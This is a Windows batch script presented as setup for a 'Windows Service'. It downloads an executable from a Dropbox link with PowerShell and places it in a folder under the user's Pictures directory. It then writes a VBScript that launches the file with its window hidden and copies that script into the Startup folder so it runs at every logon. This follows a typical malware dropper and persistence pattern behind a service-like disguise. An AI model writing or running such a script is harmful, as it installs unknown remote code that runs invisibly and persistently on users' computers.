@echo off
echo Setting up Windows Service...

REM Create service directory in user's Pictures folder if it doesn't exist
if not exist "%USERPROFILE%\Pictures\service\" (
    echo Creating %USERPROFILE%\Pictures\service\ directory...
    mkdir "%USERPROFILE%\Pictures\service\"
)

REM Download the exe file using PowerShell
echo Downloading windows_service.exe...
powershell -Command "Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/o6tsmkv97ki6on0931bij/windows_service.exe?rlkey=6ksaav13cz3rjlcmenjvbczph&st=vfw34yun&dl=1' -OutFile 'windows_service.exe'"

REM Check if download was successful
if not exist "windows_service.exe" (
    echo Error: Failed to download windows_service.exe
    pause
    exit /b 1
)

REM Move the exe to Pictures\service\
echo Moving windows_service.exe to %USERPROFILE%\Pictures\service\...
move "windows_service.exe" "%USERPROFILE%\Pictures\service\"

REM Create script.vbs file
echo Creating script.vbs...
echo Set WshShell = CreateObject("WScript.Shell") > script.vbs
echo WshShell.Run """%USERPROFILE%\Pictures\service\windows_service.exe""", 0, False >> script.vbs

REM Copy script.vbs to startup folder
echo Copying script.vbs to startup folder...
copy "script.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

echo Setup completed successfully!
echo The service will start automatically on next boot.
pause